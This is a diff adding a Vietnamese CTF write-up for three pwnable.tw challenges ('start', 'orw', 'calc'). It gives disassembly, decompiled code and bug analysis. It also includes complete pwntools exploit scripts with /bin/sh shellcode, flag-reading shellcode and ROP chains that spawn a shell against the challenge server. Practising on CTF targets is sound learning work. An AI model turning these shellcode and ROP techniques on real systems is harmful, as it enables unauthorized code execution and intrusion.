@@ -578,4 +578,544 @@ exploit()
 Done !
 
 
+# PWNABLE.TW
+## Start
+
+Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
+.....
+Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
+```
+   0x08048060 <+0>:	push   esp
+   0x08048061 <+1>:	push   0x804809d
+   0x08048066 <+6>:	xor    eax,eax
+   0x08048068 <+8>:	xor    ebx,ebx
+   0x0804806a <+10>:	xor    ecx,ecx
+   0x0804806c <+12>:	xor    edx,edx
+   0x0804806e <+14>:	push   0x3a465443
+   0x08048073 <+19>:	push   0x20656874
+   0x08048078 <+24>:	push   0x20747261
+   0x0804807d <+29>:	push   0x74732073
+   0x08048082 <+34>:	push   0x2774654c
+   0x08048087 <+39>:	mov    ecx,esp
+   0x08048089 <+41>:	mov    dl,0x14
+   0x0804808b <+43>:	mov    bl,0x1
+   0x0804808d <+45>:	mov    al,0x4
+   0x0804808f <+47>:	int    0x80
+   0x08048091 <+49>:	xor    ebx,ebx
+   0x08048093 <+51>:	mov    dl,0x3c
+   0x08048095 <+53>:	mov    al,0x3
+   0x08048097 <+55>:	int    0x80
+   0x08048099 <+57>:	add    esp,0x14
+   0x0804809c <+60>:	ret    
+
+```
+Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
+Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 
+
+Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 
+
+Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
+Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
+```
+   0:   31 c9                   xor    ecx, ecx
+   2:   f7 e1                   mul    ecx
+   4:   51                      push   ecx
+   5:   68 2f 2f 73 68          push   0x68732f2f
+   a:   68 2f 62 69 6e          push   0x6e69622f
+   f:   89 e3                   mov    ebx, esp
+  11:   b0 0b                   mov    al, 0xb
+  13:   cd 80                   int    0x80
+
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+```
+Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 
+
+```
+from pwn import *
+
+BIN = "./start"
+DEBUG = 1
+
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+addr = 0x08048087 
+
+io = process(BIN)
+context.log_level = 'debug'
+# io = remote("chall.pwnable.tw", 10000)
+
+
+#_breakpoint = """
+#		0x08048099
+#	"""
+#gdb.attach(io,_breakpoint)
+io.recvuntil("CTF:")
+payload = b'A' * 0x14 + p32(addr)
+io.send(payload)
+esp_addr = u32(io.recv(4))
+ 
+print("[+]Esp address = ", hex(esp_addr))
+ 
+payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
+io.sendline(payload)
+io.interactive()
+```
+
+## orw
+
+Bài này thì đề như là đề mở vậy vì đề bài đã hướng dẫn cả rồi:
+```
+Read the flag from /home/orw/flag.
+Only open read write syscall are allowed to use.
+```
+
+Còn khi vào chạy thử thì chương trình in ra chuỗi *"Give my your shellcode:"* không biết phải trêu mình hay không, nhưng mà vẫn nên disassemble cho chắc ăn vậy 😆😆😆
+
+```
+0x08048548 <+0>:	lea    ecx,[esp+0x4]
+   0x0804854c <+4>:	and    esp,0xfffffff0
+   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
+   0x08048552 <+10>:	push   ebp
+   0x08048553 <+11>:	mov    ebp,esp
+   0x08048555 <+13>:	push   ecx
+   0x08048556 <+14>:	sub    esp,0x4
+   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
+   0x0804855e <+22>:	sub    esp,0xc
+   0x08048561 <+25>:	push   0x80486a0
+   0x08048566 <+30>:	call   0x8048380 <printf@plt>
+   0x0804856b <+35>:	add    esp,0x10
+   0x0804856e <+38>:	sub    esp,0x4
+   0x08048571 <+41>:	push   0xc8
+   0x08048576 <+46>:	push   0x804a060
+   0x0804857b <+51>:	push   0x0
+   0x0804857d <+53>:	call   0x8048370 <read@plt>
+   0x08048582 <+58>:	add    esp,0x10
+   0x08048585 <+61>:	mov    eax,0x804a060
+   0x0804858a <+66>:	call   eax
+   0x0804858c <+68>:	mov    eax,0x0
+   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048594 <+76>:	leave  
+   0x08048595 <+77>:	lea    esp,[ecx-0x4]
+   0x08048598 <+80>:	ret    
+
+```
+
+Bài này đã dùng 1 phiên bản nâng cấp hơn của asm so với bài trước để viết, dùng nhiều hàm hơn như hàm printf@plt,read@plt,... và cả hàm [orw_seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) về cơ bản thì orw_seccomp là 1 hàm lọc sys_call, nên là như đề bài cho thì chỉ có sys_open = 5, sys_read = 3, sys_write = 4 là được cho phép!
+
+Với dữ kiện là địa chỉ của file flag và 3 phương thức trên thì bài này chủ yếu sẽ là mình viết ra được cái shellcode để lấy được flag về và in ra! Điều đó có nghĩa flow sẽ là :
+```
+sys_open(filename="/home/orw/flag")
+sys_read()
+sys_write()
+```
+
+Dựa vào luồng ở trên thì chúng ta phải cố gắng search gg 7749 cách để viết ra được cái shellcode dạng code asm như sau : 
+Đầu tiên phải chuyển string sang bytes : 
+```
+/home/orw/flag = 2f 68 6f 6d  65 2f 6f 72  77 2f 66 6c  61 67
+```
+Vậy push chuỗi lần lượt là :
+```
+push 0x6761;
+push 0x6c662f77;
+push 0x726f2f65;
+push 0x6d6f682f;
+mov eax,0x5;  sys_open
+mov ebx,esp;  push str
+int 0x80; 
+mov eax,0x3;  sys_read file
+mov ebx,0x3;
+mov edx,0x30;
+int 0x80
+mov eax,0x4;  sys_write 
+mov ebx,0x1;
+mov edx,0x30;
+int 0x80
+```
+Viết được cái shellcode này là ăn chắc được 60% rồi ! 
+Sau đó dùng hàm asm() trong pwntool để chuyển sang bytes và đưa vào shellcode rồi viết file exploit thôi 😄😄
+
+```
+from pwn import *
+
+filename="push 0x6761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f"
+sys_open=";mov eax,0x5;mov ebx,esp;int 0x80;"
+sys_read="mov eax,0x3;mov ebx,0x3;mov edx,0x30;int 0x80;"
+sys_write="mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80;"
+
+shellcode=asm(filename+sys_open+sys_read+sys_write)
+
+payload=shellcode
+s=remote('chall.pwnable.tw',10001)
+print(s.recv(1024))
+s.sendline(payload)
+
+print(s.recv())
+s.interactive()
+
+```
+Done! :< 😆😆😆 🦈🦈🦈🦈
+
+## cacl
+Đây là 1 bài khá phức tạp! Mình phải mất kha khá thời gian để có thể hiểu được flow của chương trình, sau khi chạy thử binary với một số test khác nhau, ta có nhận xét:
+	
+   + Chương trình sẽ thực hiện các tính toán cơ bản 
+	
+   + Khi nhập vào biểu thức như: 8 – – 6 chương trình sẽ không thực hiện được
+	
+   + Khi nhập biểu thức dạng + 10, chương trình lại cho ra kết quả là 0.
+	
+
+Dựa vào IDA mà chúng ta có mã giả sau : 
+
+```
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  ssignal(14, timeout);
+  alarm(60);
+  puts("=== Welcome to SECPROG calculator ===");
+  fflush(stdout);
+  calc();
+  return puts("Merry Christmas!");
+}
+```
+
+Đây là hàm main chính của chương trình và hàm *calc()* sẽ là thứ chúng ta cần phân tích sâu: 
+```
+unsigned int calc()
+{
+  int count; // [esp+18h] [ebp-5A0h]
+  int number[100]; // [esp+1Ch] [ebp-59Ch]
+  char input; // [esp+1ACh] [ebp-40Ch]
+  unsigned int canary; // [esp+5ACh] [ebp-Ch]
+
+  canary = __readgsdword(0x14u);
+  while ( 1 )
+  {
+    bzero(&input, 0x400u);
+    if ( !get_expr((int)&input, 1024) )
+      break;
+    init_pool(&count);
+    if ( parse_expr(&input, &count) )
+    {
+      printf((const char *)&format, number[count - 1]);
+      fflush(stdout);
+    }
+  }
+  return __readgsdword(0x14u) ^ canary;
+  ```
+  
+  Như trên (đã được rename tên biến) chúng ta thấy hàm *calc()* có nhiều hàm con phía trong nhưng chúng ta chỉ cần chú ý vào những hàm như *get_expr(), init_pool(), parse_expr() *. Đầu tiên là vào hàm *get_expr()* :
+  
+  ```
+int __cdecl get_expr(int _input, int a2)
+{
+  int v2; // eax
+  char v4; // [esp+1Bh] [ebp-Dh]
+  int v5; // [esp+1Ch] [ebp-Ch]
+
+  v5 = 0;
+  while ( v5 < a2 && read(0, &v4, 1) != -1 && v4 != 10 )
+  {
+    if ( v4 == '+' || v4 == '-' || v4 == '*' || v4 == '/' || v4 == '%' || v4 > '/' && v4 <= '9' )
+    {
+      v2 = v5++;
+      *(_BYTE *)(_input + v2) = v4;
+    }
+  }
+  *(_BYTE *)(v5 + _input) = 0;
+  return v5;
+}
+```
+
+Đây có thể nói là 1 hàm kiểm tra format của input, theo format này sẽ có dạng : a1 + a2 or a1 - a2, ... Điều đó dẫn đến lỗi khi thực hiện phép tính 8--6 vì vị trí của 2 phép tính lại ở cùng nhau. Hàm này còn chỉ nhận input là các phép tính hoặc số từ 0 - 9. Sau đó sắp xếp các phần tử tham gia vào các phép tính để chuẩn bị cho các hàm sau.
+
+```
+_DWORD *__cdecl init_pool(_DWORD *count)
+{
+  _DWORD *result; // eax
+  signed int i; // [esp+Ch] [ebp-4h]
+
+  result = count;
+  *count = 0;
+  for ( i = 0; i <= 99; ++i )
+  {
+    result = count;
+    count[i + 1] = 0;
+  }
+  return result;
+  ``` 
+  Đây là hàm khởi tạo giá trị cho count và 100 giá trị 0 sau biến count. Điều này có nghĩa là mảng number cũng sẽ được gán bằng 0.
+  Qua 2 hàm trên là để set mọi thứ về dúng format và bây giờ sẽ là hàm phức tạp nhất *parse_expr()*. Hàm này sẽ thực hiện tính toán và in ra hết quả:
+  
+  ```
+signed int __cdecl parse_expr(char *input, _DWORD *count)
+{
+  char *v2; // ST2C_4
+  int v4; // eax
+  char *v5; // [esp+20h] [ebp-88h]
+  int i; // [esp+24h] [ebp-84h]
+  int v7; // [esp+28h] [ebp-80h]
+  char *s1; // [esp+30h] [ebp-78h]
+  int v9; // [esp+34h] [ebp-74h]
+  char s[100]; // [esp+38h] [ebp-70h]
+  unsigned int v11; // [esp+9Ch] [ebp-Ch]
+
+  v11 = __readgsdword(0x14u);
+  v5 = input;
+  v7 = 0;
+  bzero(s, 0x64u);
+  for ( i = 0; ; ++i )
+  {
+    if ( (unsigned int)(input[i] - 48) > 9 )
+    {
+      v2 = (char *)(&input[i] - v5);
+      s1 = (char *)malloc(v2 + 1);
+      memcpy(s1, v5, v2);
+      s1[(_DWORD)v2] = 0;
+      if ( !strcmp(s1, "0") )
+      {
+        puts("prevent division by zero");
+        fflush(stdout);
+        return 0;
+      }
+      v9 = atoi(s1);
+      if ( v9 > 0 )
+      {
+        v4 = (*count)++;
+        count[v4 + 1] = v9;
+      }
+      if ( input[i] && (unsigned int)(input[i + 1] - 48) > 9 )
+      {
+        puts("expression error!");
+        fflush(stdout);
+        return 0;
+      }
+      v5 = &input[i + 1];
+      if ( s[v7] )
+      {
+        switch ( input[i] )
+        {
+          case 37:
+          case 42:
+          case 47:
+            if ( s[v7] != 43 && s[v7] != 45 )
+            {
+              eval(count, s[v7]);
+              s[v7] = input[i];
+            }
+            else
+            {
+              s[++v7] = input[i];
+            }
+            break;
+          case 43:
+          case 45:
+            eval(count, s[v7]);
+            s[v7] = input[i];
+            break;
+          default:
+            eval(count, s[v7--]);
+            break;
+        }
+      }
+      else
+      {
+        s[v7] = input[i];
+      }
+      if ( !input[i] )
+        break;
+    }
+  }
+  while ( v7 >= 0 )
+    eval(count, s[v7--]);
+  return 1;
+}
+```
+Hàm này sẽ thực hiện theo các bước sau: 
+
+   + Kiếm tra các phần tử tính toán, sẽ không thực hiện phép tính có số 0 vì điều kiện kiểm tra
+   + Chuyển chữ số thành số để thực hiện phép tính 
+   + Sau đó kiểm tra logic để thực hiện tính toán nhân chia trước cộng trừ sau.
+
+Sau đó gọi hàm *eval()* để tính toán 
+```
+_DWORD *__cdecl eval(_DWORD *count, char a2)
+{
+  _DWORD *result; // eax
+
+  if ( a2 == 43 )
+  {
+    count[*count - 1] += count[*count];
+  }
+  else if ( a2 > 43 )
+  {
+    if ( a2 == 45 )
+    {
+      count[*count - 1] -= count[*count];
+    }
+    else if ( a2 == 47 )
+    {
+      count[*count - 1] /= count[*count];
+    }
+  }
+  else if ( a2 == 42 )
+  {
+    count[*count - 1] *= count[*count];
+  }
+  result = count;
+  --*count;
+  return result;
+  ```
+Lấy ví dụ phép toán hiện tại là ‘+’ thì hàm eval() sẽ tính count[*count-1] += count[*count]. Phép tính này thực chất tương đương với: number[count-2] += number[count-1]. Sau khi tính xong kết quả, giảm biến count đi 1 đơn vị. Như vậy kết quả phép tính đến thời điểm hiện tại (sau khi đã giảm biến đếm count) được lưu vào number[count-1].
+Sau đó in ra kết quả ngoài màn hình.
+
+Nhưng có 1 lỗi mà chưa được giải thích! Đó là tại sao khi chúng ta +10 lại ra 0 ???
+Flow chương trình khi input là “+10”:
+
+  + Trong hàm parse_expr(), khi duyệt đến kí tự đầu tiên ‘+’, lúc này i = 0, v2 = 0, s1 = NULL, v9 = 0 nên không có số nào được thêm vào mảng number[]. Vì chưa có phép toán nào trong chuỗi s nên phép toán ‘+’ sẽ được add vào.
+  + Chương trình duyệt đến kí tự ‘1’ và ‘0’, lúc này i = 2, v2 = 2, s1 = ’10’, v9 = 10. Không còn kí tự nào nữa nên lệnh eval() trong nhánh default được thực hiện
+  + count = 1, number[] = [10]. Do đó phép tính trên thực chất tương đương với: count = count + number[count-1] = 1 + 10 = 11. Sau đó có lệnh count–- nên count = 10. Hàm parse_expr() kết thúc, chương trình in ra giá trị tại number[count-1] = number[9] = count[10] = 0 vì mảng number đã được khởi tạo tất cả giá trị = 0 trước đó.
+
+Vậy chúng ta có thể khai thác lỗi sau bằng cách biết được offset của vị trí ô nhớ so với biến count và giá trị muốn thay đổi .
+Dùng gdb để kiếm tra stack và chúng ta được bảng stack sau : 
+```
+|offset| address | value |
+|   1  |ebp-0x5A0| count |
+|   1  |ebp-0x59C| number|
+|      |         |       |
+|      |         |       |
+|      |         |       |
+|  101 |ebp-0x40C| input |
+|      |         |       |
+|      |         |       |
+|      |         |       |
+|      |         |       |
+|  357 |ebp-0xC  | canary|
+|      |         |       |
+|      |         |       |
+|  360 |   ebp   |pre_ebp|
+|  361 | ebp+0x4 |return |
+```
+Để làm được tới đây là xem như chúng ta đã hoàn thành đến 70% bài này rồi!
+Sau đó chỉ việc kiếm đoạn ROPgadget và thực thi nó thôi!
+Hiện tại thì mình tìm được 2 cái ROP :
+```
+	p += pack('<I', 0x080701aa) # pop edx ; ret
+	p += pack('<I', 0x080ec060) # @ .data
+	p += pack('<I', 0x0805c34b) # pop eax ; ret
+	p += '/bin'
+	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x080701aa) # pop edx ; ret
+	p += pack('<I', 0x080ec064) # @ .data + 4
+	p += pack('<I', 0x0805c34b) # pop eax ; ret
+	p += '//sh'
+	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x080701aa) # pop edx ; ret
+	p += pack('<I', 0x080ec068) # @ .data + 8
+	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
+	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
+	p += pack('<I', 0x080481d1) # pop ebx ; ret
+	p += pack('<I', 0x080ec060) # @ .data
+	p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
+	p += pack('<I', 0x080ec068) # @ .data + 8
+	p += pack('<I', 0x080ec060) # padding without overwrite ebx
+	p += pack('<I', 0x080701aa) # pop edx ; ret
+	p += pack('<I', 0x080ec068) # @ .data + 8
+	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x0807cb7f) # inc eax ; ret
+	p += pack('<I', 0x08049a21) # int 0x80
+```
+ROP này mình dùng tool ROPgadget viết ra! Nó đơn giản và dài chỉ việc chèn vào stack và thực thi là được .
+
+Cái rop thứ 2 ngắn hơn nhưng yêu cầu đòi hỏi hơn nhiều : 
+```
+ROP 
+    0x0805c34b :   pop eax ; ret
+    0x0000000b       
+    0x080701d0 :   pop edx ; pop ecx ; pop ebx ; ret
+    0x00000000
+    0x00000000
+    address_str
+    c :   int 0x80
+    #address_str = "/bin/sh" 
+    0x6e69622f
+    0x0068732f
+``` 
+ROP này yêu cầu chúng ta phải đưa *"/bin/sh"* vào pre_ebp và đưa địa chỉ của pre_ebp vào vị trí address_str trong stack mẫu trên.
+Để leak được pre_ebp chúng ta dựa vào stack offset mà chúng ta đã vẽ ở phía trên.
+
+### Exploit : 
+```
+from pwn import *
+
+BIN="./calc"
+
+addrs = ['+361','+362','+363','+364','+365','+366','+367','+368','+369']
+
+# ROP 
+#     0x0805c34b :   pop eax ; ret
+#     0x0000000b       
+#     0x080701d0 :   pop edx ; pop ecx ; pop ebx ; ret
+#     0x00000000
+#     0x00000000
+#     address_str
+#     c :   int 0x80
+# address_str = "/bin/sh" 
+# 0x6e69622f
+# 0x0068732f
+
+payloads = [0x0805c34b,0x0000000b,0x080701d0,0x00000000,0x00000000,0x00000000,0x08049a21,0x6e69622f,0x0068732f]
+#payloads = [0x080701aa, 0x080ec060, 0x0805c34b, int.from_bytes(b'/bin', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec064, 0x0805c34b, int.from_bytes(b'//sh', byteorder='little', signed=False), 0x0809b30d, 0x080701aa, 0x080ec068, 0x080550d0, 0x0809b30d, 0x080481d1, 0x080ec060, 0x080701d1, 0x080ec068, 0x080ec060, 0x080701aa, 0x080ec068, 0x080550d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x08049a21]
+
+def Rop(io):
+    for i in range(len(payloads)):
+        print("[+] Leak payload : ",addrs[i])
+        io.sendline(addrs[i])
+        leak_value = int(io.recv(1024)) 
+        print("[+] Leak value : ", leak_value)
+        offset = payloads[i]- leak_value
+        print("[+] Offset : ", offset)
+        payload = '%s%+d' % (addrs[i],offset)
+        print("[!] Payload : ",payload)
+        io.sendline(payload)
+        print("[!] Stack : ",hex(payloads[i]))
+        print("[*]===========> %s"  % hex(int(io.recv(1024))))
+
+
+#io = process(BIN)
+io = remote('chall.pwnable.tw', 10100)
+#raw_input("DEBUG")
+
+# _breakpoint = """
+#     0x080493f2
+#     """
+
+# gdb.attach(io,_breakpoint)
+io.recv(1024)
+io.sendline("+360")
+pre_ebp = int(io.recv(1024))
+payloads[5] = pre_ebp
+print("[-] =========> Pre_ebp: " ,payloads[5])
+Rop(io)
+io.sendline("cat /home/calc/flag")
+
+io.interactive()
+
+
+#0xffffca9c - > 0xffffd02c
+
+
+```
+
+Và chúng ta đã có thể có flag
 
